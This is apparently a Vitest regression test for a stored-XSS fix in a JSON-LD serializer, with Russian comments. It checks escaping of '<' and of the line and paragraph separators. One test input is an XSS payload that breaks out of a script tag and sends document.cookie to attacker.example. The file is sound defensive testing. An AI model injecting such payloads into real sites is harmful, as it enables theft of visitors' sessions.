import { describe, expect, it } from "vitest";
import { serializeJsonLd } from "@/lib/jsonLd";

/**
 * Регрессия на сохранённый XSS в JSON-LD (аудит 2026-07-27, SEC-01).
 *
 * Заголовок статьи и название продукта приходят из админ-панели и попадают в
 * `<script type="application/ld+json">`. `JSON.stringify` не экранирует `<`, поэтому текст с
 * `</script>` вырывался из блока и исполнялся у каждого посетителя раздела.
 */

// Коды, а не литералы: U+2028 и U+2029 невидимы в редакторе и потерялись бы при правке файла.
const LINE_SEPARATOR = String.fromCodePoint(0x2028);
const PARAGRAPH_SEPARATOR = String.fromCodePoint(0x2029);

describe("serializeJsonLd", () => {
  it("не оставляет последовательность </script> в выводе", () => {
    const payload = {
      name: "QBit</script><script>fetch('https://attacker.example/?c='+document.cookie)</script>",
    };

    const serialized = serializeJsonLd(payload);

    expect(serialized).not.toContain("</script");
    expect(serialized).not.toContain("<");
    expect(serialized).toContain("\\u003c");
  });

  it("сохраняет исходные данные: JSON.parse возвращает то же значение", () => {
    const payload = {
      "@context": "https://schema.org",
      headline: "Автоматизация <заявок> & отчётности",
      nested: { list: ["a</script>b", "плановый > факт"] },
    };

    expect(JSON.parse(serializeJsonLd(payload))).toEqual(payload);
  });

  it("экранирует U+2028 и U+2029, обрывающие строку в JavaScript", () => {
    const original = `до${LINE_SEPARATOR}после${PARAGRAPH_SEPARATOR}конец`;

    const serialized = serializeJsonLd({ text: original });

    expect(serialized).not.toContain(LINE_SEPARATOR);
    expect(serialized).not.toContain(PARAGRAPH_SEPARATOR);
    expect(serialized).toContain("\\u2028");
    expect(serialized).toContain("\\u2029");
    expect(JSON.parse(serialized).text).toBe(original);
  });

  it("не портит обычный текст без опасных символов", () => {
    const payload = { headline: "Меньше потерянных заявок" };

    expect(serializeJsonLd(payload)).toBe(JSON.stringify(payload));
  });
});
